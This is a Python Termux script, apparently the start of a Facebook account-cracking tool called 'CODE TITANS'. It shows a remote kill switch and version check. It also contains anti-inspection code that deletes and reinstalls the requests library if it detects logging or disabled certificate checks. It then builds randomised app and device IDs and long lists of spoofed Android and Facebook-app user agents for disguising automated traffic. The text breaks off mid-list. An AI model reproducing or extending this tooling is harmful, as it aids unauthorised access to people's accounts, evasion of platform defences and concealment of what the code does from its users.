import os,time,random,re,sys,string, subprocess 
from concurrent.futures import ThreadPoolExecutor as tpe 
import urllib3,rich,base64 
from os import path,system
try:
 import time,json,uuid,requests
except:
 os.system("pip uninstall requests -y")
 os.system("pip install requests")
 os.system("pkg install espeak")
 import random
try:
   os.mkdir('/sdcard/CODE-TITANS')
except:pass
try:
    os.system('clear');print('Checking Modules..!')
    srv=requests.get('https://raw.githubusercontent.com/C0DE-TITANS/SERVER/main/TITANS/control.txt').text
    if "update" in srv:
        os.system('clear')
        for j in range(1):
            time.sleep(0.5)
            print(f'\033[1;92m Tool under Update..!')
        exit()
    elif "off" in srv:
        os.system('clear')
        for j in range(1):
            time.sleep(0.5)
            print(f'\033[1;91m Tool Closed..!')

    srv=requests.get('https://raw.githubusercontent.com/C0DE-TITANS/SERVER/main/TITANS/version.txt').text
    if "1.0.1-ON" not in srv:
        os.system('clear')
        print('A newer Version of TITAN Available..!\nUpdate to Use TITAN')
        exit()
    else:
        pass
except:print('Network Connection Error..!');exit()
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using TITANS');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using TITANS');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using TITANS');exit()



with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('pip install requests')
    exit('[â€¢] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('pip install requests')
    exit('[â€¢] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('pip install requests')
    exit('[â€¢] RE-RUN TOOL.!')

pp = []
oku = []
twfa = []
cpu = []
l = []
idx = []
loop = 0

U = '\033[1;30m'
W = '\x1b[1;97m'
G = '\x1b[1;92m'
BB = '\x1b[1;34m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

def bannera():
        os.system('clear')
        print(f""" {U}
                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
           @@@@@@@@@@@@              @@@@@@*
       @@@@@@@@@@@@@,                @@@@@@*  @@@
   @@@@@@@@@@@@@@@@&       {G}CODE{U}      @@@@@@*  @@@@@@
   %@@@@@@@@@@@@@@@@       {G}TITANS{U}    @@@@@@*    /@@@@@@@
       #@@@@@@@@@@@@@                @@@@@@*        @@@@@@@
           (@@@@@@@@@@@@.            @@@@@@*    @@@@@@@@
               /@@@@@@@@@@@@@@@@@@@  @@@@@@*  @@@@@@
{W} Version   : {G}1.0.1{U} @@@@@@@@@@@@@@@@  @@@@@@*  @@@
{W} Github    : C0DE-TITANS
{W} Telegram  : @codetitansoffc
{G}──────────────────────────────────────────""")



def appid():
        data = '0d9c1c5d-057f-4322-880f-e9a5bc85d345'
        bheem = data.split('-')
        titan = ["".join(random.sample(word, len(word))) for word in bheem]
        foxid = "-".join(titan)
        return foxid

def divid():
        data = 'd97f0a6f-88ca-4642-808c-3102994c93d0'
        bheem = data.split('-')
        titan = ["".join(random.sample(word, len(word))) for word in bheem]
        foxid = "-".join(titan)
        return foxid

dalda = ["Dalvik/1.4.0 (Linux; U; Android 2.3.3; K080 Build/GRI40)", "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-N7000 Build/IMM76D)", "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8552 Build/JZO54K)", "Dalvik/1.6.0 (Linux; U; Android 4.1.2; HTC Desire 500 Build/JZO54K)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9082 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9195 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; MX-T97008N1 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.4.2; 0PCV1 Build/KOT49H)", "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-N5110 Build/KOT49H)", "Dalvik/1.6.0 (Linux; U; Android 4.4.4; SM-A300H Build/KTU84P)", "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-N9005 Build/LRX21V)", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; C6603 Build/10.7.A.0.222)", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; D5803 Build/23.4.A.1.264)", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Nexus 4 Build/LMY48T)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; E79-E Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.4.4; AO5510 Build/KTU84Q)", "Dalvik/1.6.0 (Linux; U; Android 4.4.4; Lenovo TAB 2 A10-70F Build/KTU84P)", "Dalvik/2.1.0 (Linux; U; Android 5.0.2; HTC One Build/LRX22G)", "Dalvik/2.1.0 (Linux; U; Android 5.0.2; SM-G850F Build/LRX22G)", "Dalvik/2.1.0 (Linux; U; Android 5.0.2; XT1033 Build/LXB22.46-28)", "Dalvik/2.1.0 (Linux; U; Android 5.1; GT-I8160 Build/LMY47I)", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5 Build/MMB29K)", "Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001)", "Dalvik/2.1.0 (Linux; U; Android 13; CPH2401 Build/TP1A.220905.001)", "Dalvik/2.1.0 (Linux; U; Android 11; SM-A505F Build/RP1A.200720.012)", "Dalvik/2.1.0 (Linux; U; Android 12; RMX3085 Build/SP1A.210812.016)", "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 5 Pro MIUI/V11.0.5.0.PEIMIXM)", "Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 9 Pro Max Build/SKQ1.211019.001)", "Dalvik/2.1.0 (Linux; U; Android 13; IV2201 Build/TP1A.220905.001)", "Dalvik/2.1.0 (Linux; U; Android 13; V2141 Build/TP1A.220624.014)", "Dalvik/2.1.0 (Linux; U; Android 11; CPH2239 Build/RP1A.200720.011)", "Dalvik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003)", "Dalvik/2.1.0 (Linux; U; Android 10; M2006C3MII MIUI/V12.0.18.0.QCTINXM)", "Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016)", "Dalvik/2.1.0 (Linux; U; Android 11; vivo 1901 Build/RP1A.200720.012)", "Dalvik/2.1.0 (Linux; U; Android 13; V2130 Build/TP1A.220624.014)", "Dalvik/2.1.0 (Linux; U; Android 13; CPH2467 Build/RKQ1.211119.001)", "Dalvik/2.1.0 (Linux; U; Android 12; M2003J15SC Build/SP1A.210812.016)", "Dalvik/2.1.0 (Linux; U; Android 12; DN2101 Build/SP1A.210812.016)", "Dalvik/2.1.0 (Linux; U; Android 9; MiTV-AXSO0 Build/PI)", "Dalvik/2.1.0 (Linux; U; Android 12; RMX2151 Build/SP1A.210812.016)", "Dalvik/2.1.0 (Linux; U; Android 10; CPH2179 Build/QP1A.190711.020)", "Dalvik/2.1.0 (Linux; U; Android 11; vivo 1904 Build/RP1A.200720.012)", "Dalvik/2.1.0 (Linux; U; Android 12; vivo 1907 Build/SP1A.210812.003)", "Dalvik/2.1.0 (Linux; U; Android 13; SM-E236B Build/TP1A.220624.014)", "Dalvik/2.1.0 (Linux; U; Android 13; V2059 Build/TP1A.220624.014)", "Dalvik/2.1.0 (Linux; U; Android 13; SM-A336E Build/TP1A.220624.014)", "Dalvik/2.1.0 (Linux; U; Android 11; RMX2001 Build/RP1A.200720.011)", "Dalvik/2.1.0 (Linux; U; Android 12; M2101K7AI Build/SKQ1.210908.001)", "Dalvik/2.1.0 (Linux; U; Android 12; 2201116SI Build/SKQ1.211006.001)", "Dalvik/2.1.0 (Linux; U; Android 12; 2201117TI Build/SKQ1.211103.001)", "Dalvik/2.1.0 (Linux; U; Android 13; SM-A146B Build/TP1A.220624.014)", "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S7390G Build/JZO54K)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9152 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; SM-G3815 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)", "Dalvik/1.6.0 (Linux; U; Android 4.1.1; GEM7100 Build/JRO03H)", "Dalvik/1.6.0 (Linux; U; Android 4.1.1; Micromax A110 Build/JRO03C)", "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S6312 Build/JZO54K)", "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S7262 Build/JZO54K)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9195 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7580 Build/JDQ39)", "Dalvik/1.6.0 (Linux; U; Android 4.3; LT29i Build/9.2.A.1.205)", "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-N7100 Build/KOT49H)"]
ends = [
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367824;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627150;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X200;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367825;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627151;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X300;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367826;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627152;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X400;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367827;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627153;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X500;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367828;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627154;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X600;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367829;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627155;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X700;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367830;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627156;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X800;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367831;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627157;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X900;FBSV/11;FBOP/1;FBCA/arm64-v8a;]",
    "[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367832;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627158;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X1000;FBSV/11;FBOP/1;FBCA/arm64-v8a;]"
	"FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.625,width=1440,height=2960};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF/Samsung;FBBD/Galaxy Note9;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/9;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/Verizon Wireless;FBMF/Samsung;FBBD/Galaxy S20 FE 5G UW;FBPN/com.facebook.katana;FBDV/SM-G781V;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1440,height=3200};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Samsung;FBBD/Galaxy S21 Ultra 5G;FBPN/com.facebook.katana;FBDV/SM-G988U;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1440,height=3088};FBLC/en_US;FBRV/492627149;FBCR/Verizon Wireless;FBMF/Samsung;FBBD/Galaxy Note10+ 5G;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/Samsung;FBBD/Galaxy A50;FBPN/com.facebook.katana;FBDV/SM-A505U;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.75,width=1440,height=2960};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Samsung;FBBD/Galaxy S9;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/9;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3,width=720,height=1560};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF/LG;FBBD/LG Stylo 5;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF /Samsung;FBBD/Galaxy S21;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S21;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/28.0.0.20.16;FBPN/com.facebook.katana;FBLC/en_US;FBBV/273235881;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1440,height=2960};FB_FW/1;"
	'[FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/184895505;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/3.4;FBBV/258875;FBDM/{density=0.75,width=240,height=320};FBLC/tr_TR;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/LG-E400;FBSV/2.3.6;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775739;FBDM/{density=1.75,width=720,height=1473};FBLC/es_LA;FBRV/491343425;FBCR/Claro;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 2.4;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775739;FBDM/{density=2.25,width=720,height=1479};FBLC/en_US;FBRV/490570395;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia C30;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.075,width=1080,height=2151};FBLC/en_US;FBRV/492627149;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367820;FBDM/{density=1.9125,width=720,height=1517};FBLC/en_GB;FBRV/493074847;FBCR/Sky;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 5.3;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775721;FBDM/{density=2.25,width=720,height=1332};FBLC/es_LA;FBRV/490734301;FBCR/cricket;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia C2 Tennen;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775755;FBDM/{density=2.5,width=1080,height=2239};FBLC/en_US;FBRV/491129917;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia XR20;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775754;FBDM/{density=1.75,width=720,height=1506};FBLC/nl_NL;FBRV/490925339;FBCR/Proximus;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G21;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775754;FBDM/{density=1.75,width=720,height=1506};FBLC/en_GB;FBRV/491199422;FBCR/LycaMobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G11;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775754;FBDM/{density=1.75,width=720,height=1515};FBLC/ar_AR;FBRV/0;FBCR/o2 - de;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G20;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    "[FBAN/FB4A;FBAV/3.5;FBBV/288849;FBDM/{density=1.5,width=480,height=800};FBLC/pt_BR;FBCR/@VIVO;FBPN/com.facebook.katana;FBDV/GT-I9100;FBSV/4.0.3;]",
 	'[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/491367872;FBDM/{density=1.75,width=720,height=1546};FBLC/en_US;FBRV/0;FBCR/AT&T;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G50;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/419.0.0.37.71;FBBV/484804803;FBDM/{density=1.75,width=720,height=1462};FBLC/en_US;FBRV/0;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia C5 Endi;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/419.0.0.37.71;FBBV/484804830;FBDM/{density=2.5,width=1080,height=2239};FBLC/en_US;FBRV/487045193;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia XR20;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/486988358;FBDM/{density=1.75,width=720,height=1517};FBLC/fr_FR;FBRV/488696280;FBCR/Bouygues Telecom;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 5.3;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367821;FBDM/{density=2.5,width=1080,height=2179};FBLC/en_US;FBRV/493346447;FBCR/T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367807;FBDM/{density=1.875,width=720,height=1350};FBLC/en_GB;FBRV/494173005;FBCR/EE;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia C01 Plus;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367821;FBDM/{density=2.5,width=1080,height=2179};FBLC/en_GB;FBRV/0;FBCR/plusnet;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X20;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775755;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/491710348;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G400 5G;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367813;FBDM/{density=2.25,width=720,height=1356};FBLC/ar_AR;FBRV/494130770;FBCR/Orange EG;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 2.3;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775728;FBDM/{density=2.625,width=1080,height=1794};FBLC/it_IT;FBRV/491343425;FBCR/I TIM;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367820;FBDM/{density=1.75,width=720,height=1473};FBLC/en_GB;FBRV/493783002;FBCR/H2O;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G10;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
    '[FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367801;FBDM/{density=2.875,width=1080,height=2065};FBLC/vi_VN;FBRV/494420173;FBCR/Viettel;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1 Plus;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
	"FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367821;FBDM/{density=2.5,width=1080,height=2224};FBLC/es_LA;FBRV/493346447;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G400 5G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367813;FBDM/{density=1.75,width=720,height=1529};FBLC/en_GB;FBRV/493040640;FBCR/Lebara;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 2.4;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367799;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/494173005;FBCR/AT&amp-T;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 3.1 A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/421.0.0.33.47;FBBV/489775754;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/490641999;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G20;FBSV/13;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367813;FBDM/{density=1.9125,width=720,height=1529};FBLC/en_GB;FBRV/492627149;FBCR/vodafone UK;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 2.4;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;"
	"FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=720,height=1280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Samsung;FBBD/Galaxy S9;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S9;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/LG;FBBD/LG G8;FBPN/com.facebook.katana;FBDV/LG G8;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.katana;FBDV/Google Pixel 4;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=720,height=1520};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/Samsung;FBBD/Galaxy A20;FBPN/com.facebook.katana;FBDV/Samsung Galaxy A20;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Motorola;FBBD/Moto G7;FBPN/com.facebook.katana;FBDV/Motorola Moto G7;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1440,height=2960};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Samsung;FBBD/Galaxy S20;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S20;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/OnePlus;FBBD/OnePlus 7T;FBPN/com.facebook.katana;FBDV/OnePlus 7T;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/LG;FBBD/LG G6;FBPN/com.facebook.katana;FBDV/LG G6;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2220};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Google;FBBD/Pixel 3;FBPN/com.facebook.katana;FBDV/Google Pixel 3;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
